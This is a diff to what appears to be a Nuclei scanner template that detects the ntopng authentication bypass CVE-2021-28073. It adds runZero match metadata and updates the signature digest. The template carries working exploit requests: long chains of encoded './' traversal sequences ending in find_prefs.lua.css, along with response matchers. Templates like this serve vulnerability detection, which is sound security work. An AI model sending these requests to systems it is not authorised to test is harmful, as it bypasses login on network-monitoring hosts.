@@ -1,5 +1,4 @@
 id: ntopng-auth-bypass
-
 info:
   name: Ntopng Authentication Bypass
   author: z3bd
@@ -14,30 +13,27 @@ info:
   classification:
     cve-id: CVE-2021-28073
   metadata:
+    runzero-match: service["product"] matches "^ntop:ntopng"
     max-request: 2
   tags: ntopng,vuln
-
 http:
   - method: GET
     path:
       - "{{BaseURL}}/lua/%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2ffind_prefs.lua.css"
       - "{{BaseURL}}/lua/.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2ffind_prefs.lua.css"
-
     matchers-condition: and
     matchers:
       - type: word
         words:
           - "application/json"
         part: header
-
       - type: word
         words:
           - '"results":'
           - '"name":'
           - '"tab":'
         condition: and
-
       - type: status
         status:
           - 200
-# digest: 4a0a0047304502200e8c9bc7faa69c19f1184f13133d2b2609bae724d56a8dff238231f68c4a1bde022100cbddd09ede3e7b47049abb8f4cdd8a675ead85beef38cc35ccb80005d33f6be6:922c64590222798bb761d5b6d8e72950
+        # digest: 4b0a00483046022100cef20eef40ea371a7ab8d435f82516aba802f2947bfaeb23c506bcf75eea22a0022100a700e13856e255362dc66af5893699ccc8495425fe7ce721018ed9a5be2c7565:922c64590222798bb761d5b6d8e72950
